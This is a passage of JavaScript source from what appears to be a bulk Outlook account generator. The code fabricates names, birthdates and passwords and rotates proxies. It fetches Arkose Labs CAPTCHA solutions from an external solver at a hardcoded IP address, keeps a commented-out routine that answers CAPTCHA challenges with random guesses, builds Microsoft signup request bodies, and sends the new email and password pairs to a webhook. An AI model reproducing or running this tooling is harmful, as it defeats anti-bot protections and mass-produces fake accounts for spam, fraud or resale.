		 //        	this.controller('loadCaptcha');
			// 	});
			// } catch(err) {
			// 	console.log(err)
			// }
			request(`http://174.114.200.242:1337/a?uaid=${this.outlookData.uaid}`, (error, response, captcha_resp) => {
				if (error) {
					reject({msg: `error`, nextStep: 'loadSite'});
				} else {
					try {
						this.status("Captcha Solved: " + captcha_resp.split("|")[0])
						this.outlookData.solve = captcha_resp;//.replace("meta=7|pk=", "meta=7|lang=en|pk=");
						this.outlookData.solved = true;
						resolve('loadCaptcha');
					} catch (err) {

					}
				}
			});
			// fun.getToken({
			//     headers: {
			// 		   "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
			//     },
			//     surl: "http://192.168.1.213:5050/",
			//     pkey: "B7D8911C-5CC8-A9A3-35B0-554ACEE604DA",
			//     site: `https://signup.live.com/signup?uaid=${this.outlookData.uaid}`
			// }).then(async token => { 
			//     let session = new fun.Session(token)
			//     let challenge = await session.getChallenge()
			//     console.log(token.token + " | Solved")
			//     for(let x = 0; x < challenge.data.game_data.waves; x++) {
			//         var fard = await challenge.answer(this.rNum(0, 5));
			//         if (fard.error || (fard.response && fard.response !== 'answered')) {
			//         	reject({msg: "Captcha Unsolvable", nextStep: 'loadCaptcha'})
			//         } else if (fard.solved) {
			//         	resolve('main')
			//         	this.outlookData.solve = fard.decryption_key;
			// 			this.outlookData.solved = true;
			//         } else {
			//         	reject({msg: "Captcha Unsolvable", nextStep: 'loadCaptcha'});
			//         }
			//     }
			// })
		});
    }
    
    rNum(min, max) { // min and max included 
        return Math.floor(Math.random() * (max - min + 1) + min)
    }  

    randPw() {
        let pw = password.randomPassword({ characters: [password.lower, password.upper, password.digits] })
        pw = pw.slice(0, (pw.length-5))
        let num = this.rNum(1000,9999)
        pw = pw + "!" + num.toString()
        return pw
    }

    genData() {
        let fname = random_name({ first: true })
        let lname = random_name({ last: true })
        let day = this.rNum(10, 25)
        let month = this.rNum(3, 9)
        let year = this.rNum(1980, 1999)
        this.birthday = `${day}:0${month}:${year}`

        this.outlookData = {fname: fname, lname: lname, day: day, month: month, year: year}
    }

    rotateProxy() {
        this.proxy = this.proxies[this.rNum(0, this.proxies.length - 1)]
    }

    sendWhook() {
        return new Promise((resolve, reject) => {
            try {
                this.webhook.send(`${this.email}@outlook.com:${this.pw} | IGN: (Unset, Set in launcher)`);
                resolve('loadSite')
            } catch (e) {
                reject({msg: e, nextStep: 'loadSite'})
            }
        });
    }

    errorCodes() {
        // TODO: Add matching functionality for extra codes
        let codes = {
            "hipValidationError": "1043",
            "hipNeeded": "1040",
            "hipEnforcementNeeded": "1041",
            "hipSMSNeeded": "1042",
            "dailyLimitIDsReached": "450",
            "oneTimeCodeInvalid": "1304",
            "verificationSltInvalid": "1324",
            "membernameTaken": "1058",
            "domainNotAllowed": "1117",
            "domainIsReserved": "1181",
            "forbiddenWord": "403",
            "passwordIncorrect": "1002",
            "passwordConflict": "1009",
            "invalidEmailFormat": "1062",
            "invalidPhoneFormat": "1063",
            "invalidBirthDate": "1039",
            "invalidGender": "1243",
            "invalidFirstName": "1240",
            "invalidLastName": "1241",
            "maximumOTTDailyError": "1204",
            "bannedPassword": "1217",
            "proofAlreadyExistsError": "1246",
            "domainExistsInAad": "1184",
            "domainExistsInAadSupportedLogin": "1185",
            "membernameTakenEasi": "1242",
            "membernameTakenPhone": "1052",
            "signupBlocked": "1220",
            "invalidMemberNameFormat": "1064",
            "passwordRequired": "1330",
            "emailMustStartWithLetter": "1256",
            "evictionWarningRequired": "1334"
        }
    }

    genBody() {
        let ts = new Date();
        this.outlookData.cipher = genCipher("","","newpwd", this.pw, this.outlookData.randomNum, this.outlookData.key)
        
        let body = {
            "RequestTimeStamp": ts,
            "MemberName":`${this.email}@outlook.com`,
            "CheckAvailStateMap":[`${this.email}@outlook.com:undefined`],
            "EvictionWarningShown":[],"UpgradeFlowToken":{},
            "FirstName":this.outlookData.fname,
            "LastName":this.outlookData.lname,
            "MemberNameChangeCount":1,
            "MemberNameAvailableCount":1,
            "MemberNameUnavailableCount":0,
            "CipherValue": this.outlookData.cipher,
            "SKI":this.outlookData.SKI,
            "BirthDate": this.birthday,
            "Country":"US",
            "IsOptOutEmailDefault":false,
            "IsOptOutEmailShown":true,
            "IsOptOutEmail":true,
            "LW":true,
            "SiteId":"292841",
            "IsRDM":0,
            "WReply": null,
            "ReturnUrl":null,
            "SignupReturnUrl":null,
            "uiflvr":1001,
            "uaid":this.outlookData.uaid,
            "SuggestedAccountType":"OUTLOOK",
            "SuggestionType":"Locked",
            // TODO: Figure out HFId and significance
            //"HFId":"9a166ed80043424d883dafb778efec5d",
            "encAttemptToken":"",
            "dfpRequestId":"",
            "scid":100118,
            "hpgid":200650
        }
        
        return body
    }

    genSolvedBody() {
        let ts = new Date();
        this.outlookData.cipher = genCipher("","","newpwd", this.pw, this.outlookData.randomNum, this.outlookData.key)

        let body = {
            "RequestTimeStamp": ts,
            "MemberName":`${this.email}@outlook.com`,
            "CheckAvailStateMap":[
               `${this.email}@outlook.com:undefined`
            ],
            "EvictionWarningShown":[
               
            ],
            "UpgradeFlowToken":{
               
            },
            "FirstName":this.outlookData.fname,
            "LastName":this.outlookData.lname,
            "MemberNameChangeCount":1,
            "MemberNameAvailableCount":1,
            "MemberNameUnavailableCount":0,
            "CipherValue":this.outlookData.cipher,
            "SKI":this.outlookData.SKI,
            "BirthDate": this.birthday,
            "Country":"US",
            "IsOptOutEmailDefault":false,
            "IsOptOutEmailShown":true,
            "IsOptOutEmail":true,
            "LW":true,
            "SiteId":"68692",
            "IsRDM":0,
            "WReply":null,
            "ReturnUrl":null,
            "SignupReturnUrl":null,
            "uiflvr":1001,
            "uaid": this.outlookData.uaid,
            "SuggestedAccountType":"EASI",
            "SuggestionType":"Prefer",
            // TODO: Figure out HFId and significance
            //"HFId":"405de830c1434978bfe8f047e6dca9dc",
            "HType":"enforcement",
            "HSol":this.outlookData.solve,
            "HPId":"B7D8911C-5CC8-A9A3-35B0-554ACEE604DA",
            "encAttemptToken": this.outlookData.encAttemptToken,
            "dfpRequestId":this.outlookData.dfpRequestId,
            "scid":100118,
            "hpgid":201040
        }
        // 75561a25d05247be7.4193130101|r=us-east-1|metabgclr=%23ffffff|maintxtclr=%231B1B1B|mainbgclr=%23ffffff|guitextcolor=%23747474|metaiconclr=%23757575|meta_height=325|meta=7|lang=en|pk=B7D8911C-5CC8-A9A3-35B0-554ACEE604DA|at=40|ag=101|cdn_url=https%3A%2F%2Fclient-api.arkoselabs.com%2Fcdn%2Ffc|lurl=https%3A%2F%2Faudio-us-east-1.arkoselabs.com|surl=https%3A%2F%2Fclient-api.arkoselabs.com
        // 99861a26197e42154.0037844305|r=eu-west-1|metabgclr=%23ffffff|maintxtclr=%231B1B1B|mainbgclr=%23ffffff|guitextcolor=%23747474|metaiconclr=%23757575|meta_height=325|meta=7|pk=B7D8911C-5CC8-A9A3-35B0-554ACEE604DA|at=40|ht=1|ag=101|cdn_url=https%3A%2F%2Fclient-api.arkoselabs.com%2Fcdn%2Ffc|lurl=https%3A%2F%2Faudio-eu-west-1.arkoselabs.com|surl=https%3A%2F%2Fclient-api.arkoselabs.com
        return body
    }

    status(msg, type) {
        console.log(`[!] ${msg}`);
    }
}


module.exports = Outlook;